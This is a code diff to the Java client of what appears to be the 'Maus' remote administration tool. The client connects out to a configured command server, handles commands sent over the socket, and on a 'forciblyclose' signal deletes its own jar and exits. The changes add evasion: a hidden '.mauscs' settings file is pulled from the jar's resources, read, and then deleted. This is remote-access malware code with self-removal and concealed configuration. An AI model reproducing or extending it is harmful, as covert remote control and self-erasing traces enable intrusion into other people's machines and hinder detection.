@@ -29,7 +29,7 @@ public class Client {
         Client.PORT = PORT;
     }
 
-    public static void main(String[] args) throws InterruptedException {
+    public static void main(String[] args) throws Exception {
         /* Load server settings and then attempt to connect to Maus. */
         Client client = new Client();
         client.loadServerSettings();
@@ -41,9 +41,9 @@ public class Client {
             socket = new Socket(getHOST(), getPORT());
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             out = new BufferedOutputStream(socket.getOutputStream());
-            System.out.println("Client.Client started: " + getHOST() + ":" + getPORT());
+            System.out.println("Client started: " + getHOST() + ":" + getPORT());
             String comm;
-            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
+            while ((comm = in.readLine()) != null) {
                 comm = in.readLine();
                 if (comm.contains("CMD ")) {
                     System.out.println(comm);
@@ -55,9 +55,8 @@ public class Client {
                 }
                 if (comm.equals("forciblyclose")) {
                     communicate("forciblyclose");
-                    String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
-                    File f = new File(jarFolder);
-                    f.deleteOnExit();
+                    File f = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
+                    f.delete();
                     System.exit(0);
                 }
             }
@@ -66,8 +65,6 @@ public class Client {
             System.out.println("Disconnected... retrying.");
             Thread.sleep(1200);
             connect();
-        } catch (URISyntaxException e) {
-            e.printStackTrace();
         }
     }
 
@@ -101,9 +98,12 @@ public class Client {
         }
     }
 
-    private void loadServerSettings() {
-        String path = Client.class.getProtectionDomain().getCodeSource().getLocation().getPath();
-        try (BufferedReader reader = new BufferedReader(new FileReader(new File( path + ".mauscs")))
+    /* Loads the .mauscs*/
+    private void loadServerSettings() throws Exception {
+        String filename = getMauscs();
+        Thread.sleep(2000);
+        File mauscs = new File(filename);
+        try (BufferedReader reader = new BufferedReader(new FileReader(mauscs))
         ) {
             String line;
             StringBuilder stringBuilder = new StringBuilder();
@@ -119,6 +119,23 @@ public class Client {
         } catch (IOException e) {
             e.printStackTrace();
         }
+        mauscs.delete();
+    }
+
+    private static String getMauscs() throws Exception {
+        String jarFolder = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()).getParentFile().getPath().replace('\\', '/');
+        try (InputStream stream = Client.class.getResourceAsStream("/Client/.mauscs");
+             OutputStream resStreamOut = new FileOutputStream(jarFolder + "/.mauscs")) {
+            int readBytes;
+            byte[] buffer = new byte[4096];
+            while ((readBytes = stream.read(buffer)) > 0) {
+                resStreamOut.write(buffer, 0, readBytes);
+            }
+        } catch (Exception ex) {
+            ex.printStackTrace();
+        }
+
+        return jarFolder + "/.mauscs";
     }
 
     private void sendFileList() {
